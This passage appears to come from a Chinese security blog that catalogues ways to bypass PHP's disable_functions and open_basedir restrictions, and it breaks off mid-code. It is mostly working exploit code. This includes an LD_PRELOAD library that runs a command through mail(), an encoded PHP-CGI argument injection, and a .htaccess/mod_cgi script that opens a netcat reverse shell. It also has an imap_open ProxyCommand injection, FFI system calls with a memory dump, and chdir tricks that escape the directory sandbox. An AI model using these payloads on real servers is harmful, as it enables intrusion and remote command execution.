<p>此外，我通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 <code>unsetenv(&quot;LD_PRELOAD&quot;)</code>，这在大部份 linux 发行套件上的确可行，但在 centos 上却无效，究其原因，centos 自己也 hook 了 unsetenv()，在其内部启动了其他进程，根本来不及删除 LD_PRELOAD 就又被劫持，导致无限循环。所以，我得找一种比 unsetenv() 更直接的删除环境变量的方式。是它，全局变量 <code>extern char** environ</code>！实际上，unsetenv() 就是对 environ 的简单封装实现的环境变量删除功能。</p>
</blockquote>
<h4 id="由于open-basedir-web目录不可写绕过"><a href="#由于open-basedir-web目录不可写绕过" class="headerlink" title="由于open_basedir+web目录不可写绕过"></a>由于open_basedir+web目录不可写绕过</h4><p>见 bypass open_basedir 的 tmpfile部分</p>
<h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>bypass_disablefunc.c</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">extern char** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void preload (void)</span><br><span class="line">&#123;</span><br><span class="line">    // get command line options and arg</span><br><span class="line">    const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line"></span><br><span class="line">    // unset environment variable LD_PRELOAD.</span><br><span class="line">    // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span><br><span class="line">    // distribution (e.g., centos), I need crafty trick.</span><br><span class="line">    int i;</span><br><span class="line">    for (i = 0; environ[i]; ++i) &#123;</span><br><span class="line">            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) &#123;</span><br><span class="line">                    environ[i][0] = &#x27;\0&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // executive command</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着用以下语句编译C文件为共享对象文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so</span><br></pre></td></tr></table></figure>

<p>bypass_disablefunc.php，代码和test.php一致：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="variable">$out_path</span> = <span class="string">&quot;/tmp/cmdout&quot;</span>;</span><br><span class="line">    <span class="variable">$evil_cmdline</span> = <span class="variable">$cmd</span> . <span class="string">&quot; &gt; &quot;</span> . <span class="variable">$out_path</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . <span class="variable">$evil_cmdline</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    putenv(<span class="string">&quot;EVIL_CMDLINE=&quot;</span> . <span class="variable">$evil_cmdline</span>);</span><br><span class="line">    <span class="variable">$so_path</span> = <span class="string">&quot;/var/www/html/bypass_disablefunc.so&quot;</span>;</span><br><span class="line">    putenv(<span class="string">&quot;LD_PRELOAD=&quot;</span> . <span class="variable">$so_path</span>);</span><br><span class="line">    mail(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . nl2br(file_get_contents(<span class="variable">$out_path</span>)) . <span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line">    unlink(<span class="variable">$out_path</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="apache-php-cgi-mod攻击"><a href="#apache-php-cgi-mod攻击" class="headerlink" title="apache+php cgi mod攻击"></a>apache+php cgi mod攻击</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>php作为cgi模式运行的时候，接受-s  -d -c 这样的参数，我们看看这些参数的功能</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-s Output HTML syntax highlighted source -d foo[=bar] Define INI entry foo with value bar</span><br></pre></td></tr></table></figure>

<p>然后再看看攻击代码片段</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char poststr[] = <span class="string">&quot;POST %s?%%2D%%64+%%61%%6C%%6C%%6F%%77%%5F&quot;</span> \ <span class="string">&quot;%%75%%72%%6C%%5F%%69%%6E%%63%%6C%%75%%64%%65%%3D%%6F%%6E+%%2D%%64&quot;</span> \ <span class="string">&quot;+%%73%%61%%66%%65%%5F%%6D%%6F%%64%%65%%3D%%6F%%66%%66+%%2D%%64+%%73&quot;</span> \ <span class="string">&quot;%%75%%68%%6F%%73%%69%%6E%%2E%%73%%69%%6D%%75%%6C%%61%%74%%69%%6F%%6E&quot;</span> \ <span class="string">&quot;%%3D%%6F%%6E+%%2D%%64+%%64%%69%%73%%61%%62%%6C%%65%%5F%%66%%75%%6E%%63&quot;</span> \ <span class="string">&quot;%%74%%69%%6F%%6E%%73%%3D%%22%%22+%%2D%%64+%%6F%%70%%65%%6E%%5F%%62&quot;</span> \ <span class="string">&quot;%%61%%73%%65%%64%%69%%72%%3D%%6E%%6F%%6E%%65+%%2D%%64+%%61%%75%%74&quot;</span> \ <span class="string">&quot;%%6F%%5F%%70%%72%%65%%70%%65%%6E%%64%%5F%%66%%69%%6C%%65%%3D%%70%%68&quot;</span> \ <span class="string">&quot;%%70%%3A%%2F%%2F%%69%%6E%%70%%75%%74+%%2D%%64+%%63%%67%%69%%2E%%66%%6F&quot;</span> \ <span class="string">&quot;%%72%%63%%65%%5F%%72%%65%%64%%69%%72%%65%%63%%74%%3D%%30+%%2D%%64+%%63&quot;</span> \ <span class="string">&quot;%%67%%69%%2E%%72%%65%%64%%69%%72%%65%%63%%74%%5F%%73%%74%%61%%74%%75%%73&quot;</span> \ <span class="string">&quot;%%5F%%65%%6E%%76%%3D%%30+%%2D%%6E HTTP/1.1\r\n&quot;</span> \</span><br></pre></td></tr></table></figure>



<p>解码出来是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%s?-d allow_url_include=on -d safe_mode=off -d suhosin.simulation3Don -d disable_functions=<span class="string">&quot;&quot;</span> -d open_basedir=none -d auto_prepend_file=php:<span class="comment">//input -d cgi.fo&quot;rce_redirect=0 -d cgi.redirect_status_env=0 -n</span></span><br></pre></td></tr></table></figure>



<p>这样Kingcope的攻击代码思路就出来了。</p>
<p>关闭各种防护的参数，打开各种危险的参数，最后利用auto_prepend_file（或auto_append_file）这个参数把黑客需要执行的系统命令传递过去了。</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>1、apache+php是用cgi模式跑的，例如apache的mod_cgid</p>
<p>2、php解释器需要可以从下面的url访问到，当然或许可能是其他的url，这个具体要看你的配置</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/php</span><br><span class="line">/cgi-bin/php5</span><br><span class="line">/cgi-bin/php-cgi</span><br><span class="line">/cgi-bin/php.cgi</span><br><span class="line">/cgi-bin/php4</span><br></pre></td></tr></table></figure>

<p>3、php版本<br>PHP版本小于5.3.12<br>PHP版本小于5.4.2</p>
<p>或者</p>
<ol>
<li> mod_cgi已经启用 </li>
<li> 必须允许.htaccess文件 , 在httpd.conf中，要注意AllowOverride选项为All </li>
<li> 必须有权限写.htaccess文件</li>
</ol>
<h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;nc -c&#x27;/bin/bash&#x27; 127.0.0.1 4444&quot;</span>; <span class="comment">//反弹一个shell出来，这里用本地的4444端口</span></span><br><span class="line"><span class="variable">$shellfile</span> =<span class="string">&quot;#!/bin/bash\n&quot;</span>; <span class="comment">//指定shell</span></span><br><span class="line"><span class="variable">$shellfile</span> .=<span class="string">&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;</span>; <span class="comment">//需要指定这个header，否则会返回500</span></span><br><span class="line"><span class="variable">$shellfile</span> .=<span class="string">&quot;<span class="subst">$cmd</span>&quot;</span>; </span><br><span class="line">functioncheckEnabled(<span class="variable">$text</span>,<span class="variable">$condition</span>,<span class="variable">$yes</span>,<span class="variable">$no</span>) <span class="comment">//this surely can be shorter</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$text</span>: &quot;</span> . (<span class="variable">$condition</span> ?<span class="variable">$yes</span> : <span class="variable">$no</span>) . <span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;checked&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    @file_put_contents(<span class="string">&#x27;.htaccess&#x27;</span>,<span class="string">&quot;\nSetEnv HTACCESS on&quot;</span>, FILE_APPEND); </span><br><span class="line">    header(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]. <span class="string">&#x27;?checked=true&#x27;</span>); <span class="comment">//执行环境的检查</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$modcgi</span> = in_array(<span class="string">&#x27;mod_cgi&#x27;</span>,apache_get_modules()); <span class="comment">// 检测mod_cgi是否开启</span></span><br><span class="line">    <span class="variable">$writable</span> = is_writable(<span class="string">&#x27;.&#x27;</span>); <span class="comment">//检测当前目录是否可写</span></span><br><span class="line">    <span class="variable">$htaccess</span> = !<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTACCESS&#x27;</span>]);<span class="comment">//检测是否启用了.htaccess</span></span><br><span class="line">        checkEnabled(<span class="string">&quot;Mod-Cgienabled&quot;</span>,<span class="variable">$modcgi</span>,<span class="string">&quot;Yes&quot;</span>,<span class="string">&quot;No&quot;</span>);</span><br><span class="line">        checkEnabled(<span class="string">&quot;Iswritable&quot;</span>,<span class="variable">$writable</span>,<span class="string">&quot;Yes&quot;</span>,<span class="string">&quot;No&quot;</span>);</span><br><span class="line">        checkEnabled(<span class="string">&quot;htaccessworking&quot;</span>,<span class="variable">$htaccess</span>,<span class="string">&quot;Yes&quot;</span>,<span class="string">&quot;No&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$modcgi</span> &amp;&amp; <span class="variable">$writable</span>&amp;&amp; <span class="variable">$htaccess</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Error. All of the above mustbe true for the script to work!&quot;</span>; <span class="comment">//必须满足所有条件</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">       </span><br><span class="line"> checkEnabled(<span class="string">&quot;Backing </span></span><br><span class="line"><span class="string">up.htaccess&quot;</span>,copy(<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.htaccess.bak&quot;</span>),<span class="string">&quot;Suceeded!Saved in </span></span><br><span class="line"><span class="string">.htaccess.bak&quot;</span>,<span class="string">&quot;Failed!&quot;</span>); <span class="comment">//备份一下原有.htaccess</span></span><br><span class="line">        </span><br><span class="line">checkEnabled(<span class="string">&quot;Write </span></span><br><span class="line"><span class="string">.htaccessfile&quot;</span>,file_put_contents(<span class="string">&#x27;.htaccess&#x27;</span>,<span class="string">&quot;Options </span></span><br><span class="line"><span class="string">+ExecCGI\nAddHandlercgi-script </span></span><br><span class="line"><span class="string">.dizzle&quot;</span>),<span class="string">&quot;Succeeded!&quot;</span>,<span class="string">&quot;Failed!&quot;</span>);<span class="comment">//.dizzle，我们的特定扩展名</span></span><br><span class="line">        checkEnabled(<span class="string">&quot;Write shellfile&quot;</span>,file_put_contents(<span class="string">&#x27;shell.dizzle&#x27;</span>,<span class="variable">$shellfile</span>),<span class="string">&quot;Succeeded!&quot;</span>,<span class="string">&quot;Failed!&quot;</span>);<span class="comment">//写入文件</span></span><br><span class="line">        checkEnabled(<span class="string">&quot;Chmod777&quot;</span>,chmod(<span class="string">&quot;shell.dizzle&quot;</span>,<span class="number">0777</span>),<span class="string">&quot;Succeeded!&quot;</span>,<span class="string">&quot;Failed!&quot;</span>);<span class="comment">//给权限</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Executing the script now.Check your listener &lt;img src = &#x27;shell.dizzle&#x27; style =&#x27;display:none;&#x27;&gt;&quot;</span>; <span class="comment">//调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="imap-open"><a href="#imap-open" class="headerlink" title="imap_open"></a>imap_open</h2><blockquote>
<p>PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。利用此漏洞的功能代码是Metasploit Framework的一部分。 </p>
</blockquote>
<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><p>存在ssh和rsh功能 且  enable_insecure_rsh = true</p>
<h3 id="利用脚本-未测试"><a href="#利用脚本-未测试" class="headerlink" title="利用脚本(未测试)"></a>利用脚本(未测试)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;imap_open&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no imap_open function!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$server</span> = <span class="string">&quot;x -oProxyCommand=echo\t&quot;</span> . base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>] . <span class="string">&quot;&gt;/tmp/cmd_result&quot;</span>) . <span class="string">&quot;|base64\t-d|sh&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//$server = &#x27;x -oProxyCommand=echo$IFS$()&#x27; . base64_encode($_GET[&#x27;cmd&#x27;] . &quot;&gt;/tmp/cmd_result&quot;) . &#x27;|base64$IFS$()-d|sh&#125;&#x27;;</span></span><br><span class="line">imap_open(<span class="string">&#x27;&#123;&#x27;</span> . <span class="variable">$server</span> . <span class="string">&#x27;:143/imap&#125;INBOX&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>); <span class="comment">// or var_dump(&quot;\n\nError: &quot;.imap_last_error());</span></span><br><span class="line">sleep(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/tmp/cmd_result&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="利用pcntl插件绕过"><a href="#利用pcntl插件绕过" class="headerlink" title="利用pcntl插件绕过"></a>利用pcntl插件绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_exec(&quot;/bin/bash&quot;, array(&quot;/tmp/b4dboy.sh&quot;));</span><br></pre></td></tr></table></figure>



<h2 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h2><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><p>FFI::load 无视 opeb_basedir 可以直接加载文件</p>
<p>FFI 相对于 php 更加底层，可以泄露内存</p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ffi</span>=FFI::cdef(<span class="string">&quot;int system(char *command);&quot;</span>,<span class="string">&quot;libc.so.6&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="string">&quot;sleep 5&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="open-basedir，禁用FFI-cdef，目录无法写文件命令执行"><a href="#open-basedir，禁用FFI-cdef，目录无法写文件命令执行" class="headerlink" title="open_basedir，禁用FFI::cdef，目录无法写文件命令执行"></a>open_basedir，禁用FFI::cdef，目录无法写文件命令执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$value=&lt;&lt;&lt;EOF</span><br><span class="line">#define FFI_SCOPE &quot;DUMMY&quot;</span><br><span class="line">#define FFI_LIB &quot;libc.so.6&quot;</span><br><span class="line"> </span><br><span class="line">int system(const char *command);</span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">$tmpHandle = tmpfile();</span><br><span class="line">$metaDatas = stream_get_meta_data($tmpHandle);</span><br><span class="line">$tmpFilename = $metaDatas[&#x27;uri&#x27;];</span><br><span class="line">fwrite($tmpHandle, $value);</span><br><span class="line">fseek($tmpHandle, 0);</span><br><span class="line">echo fread($tmpHandle, 1024);</span><br><span class="line">var_dump($tmpFilename);</span><br><span class="line">fflush($tmpHandle );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ffi=FFI::load($tmpFilename);</span><br><span class="line">$ffi-&gt;system(&#x27;echo bypass_disable_function &gt; /tmp/testing&#x27;);</span><br><span class="line"></span><br><span class="line">fclose($tmpHandle);</span><br></pre></td></tr></table></figure>



<h3 id="内存泄露"><a href="#内存泄露" class="headerlink" title="内存泄露"></a>内存泄露</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span>=FFI::load(<span class="string">&quot;/flag.h&quot;</span>);</span><br><span class="line"><span class="variable">$b</span>=FFI::cast(<span class="string">&quot;void *&quot;</span>,FFI::new(<span class="string">&quot;int[1]&quot;</span>,<span class="literal">false</span>));</span><br><span class="line"><span class="variable">$a</span>=FFI::string(<span class="variable">$b</span>-<span class="number">400000</span>,<span class="number">400000</span>);</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="php-json-bypass"><a href="#php-json-bypass" class="headerlink" title="php-json-bypass"></a>php-json-bypass</h2><p><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></p>
<h2 id="php7-backtrace-bypass"><a href="#php7-backtrace-bypass" class="headerlink" title="php7-backtrace-bypass"></a><strong>php7-backtrace-bypass</strong></h2><p> <a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a> </p>
<h2 id="php7-gc-bypass"><a href="#php7-gc-bypass" class="headerlink" title="php7-gc-bypass"></a><strong>php7-gc-bypass</strong></h2><p> <a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a> </p>
<h2 id="win-shell-execute"><a href="#win-shell-execute" class="headerlink" title="win_shell_execute"></a>win_shell_execute</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!extension_loaded(<span class="string">&quot;win32std&quot;</span>)) <span class="keyword">die</span>(<span class="string">&quot;win32std extension required!&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cmd.exe&quot;</span>); <span class="comment">//just to be sure that protections work well</span></span><br><span class="line">win_shell_execute(<span class="string">&quot;..\\..\\..\\..\\windows\\system32\\cmd.exe&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h2><h2 id="推荐网址"><a href="#推荐网址" class="headerlink" title="推荐网址"></a>推荐网址</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/169156.html">https://www.freebuf.com/articles/web/169156.html</a></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p> <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197745#h3-5">https://www.anquanke.com/post/id/197745#h3-5</a> </p>
<p> <a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95">浅谈几种Bypass-disable-functions的方法</a> </p>
<h1 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass  open_basedir"></a>bypass  open_basedir</h1><h2 id="tmpfile绕过open-basedir在-tmp目录写文件"><a href="#tmpfile绕过open-basedir在-tmp目录写文件" class="headerlink" title="tmpfile绕过open_basedir在/tmp目录写文件"></a>tmpfile绕过open_basedir在/tmp目录写文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$value=&lt;&lt;&lt;EOF</span><br><span class="line"></span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">$tmpHandle = tmpfile();</span><br><span class="line">$metaDatas = stream_get_meta_data($tmpHandle);</span><br><span class="line">$tmpFilename = $metaDatas[&#x27;uri&#x27;];</span><br><span class="line">fwrite($tmpHandle, $value);</span><br><span class="line">fseek($tmpHandle, 0);</span><br><span class="line">echo fread($tmpHandle, 1024);</span><br><span class="line">var_dump($tmpFilename);</span><br><span class="line">fflush($tmpHandle );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fclose($tmpHandle);</span><br></pre></td></tr></table></figure>







<h2 id="ini-set与chdir-绕过open-basedir"><a href="#ini-set与chdir-绕过open-basedir" class="headerlink" title="ini_set与chdir 绕过open_basedir"></a>ini_set与chdir 绕过open_basedir</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="glob协议列根目录"><a href="#glob协议列根目录" class="headerlink" title="glob协议列根目录"></a>glob协议列根目录</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>-&gt;__toString().<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="realpath列目录"><a href="#realpath列目录" class="headerlink" title="realpath列目录"></a>realpath列目录</h2><p>realpath是php中一个将相对路径转化为绝对路径的方法，而如果开启了<code>open_basedir</code>的话，如果我们传入一个不存在的文件名，会返回false，但是如果我们传入一个不在<code>open_basedir</code>里的文件的话，他就会返回<code>file is not within the allowed path(s)</code>，所以这个时候就可以类似于报错盲注去爆出文件名了<br>这里有个小trick，利用windows下的通配符&lt;和&gt;去进行爆破可以快一点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">printf(<span class="string">&quot;open_basedir: %s&lt;br/&gt;&lt;br/&gt;&quot;</span>, ini_get(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line">set_error_handler(<span class="string">&#x27;isexist&#x27;</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span 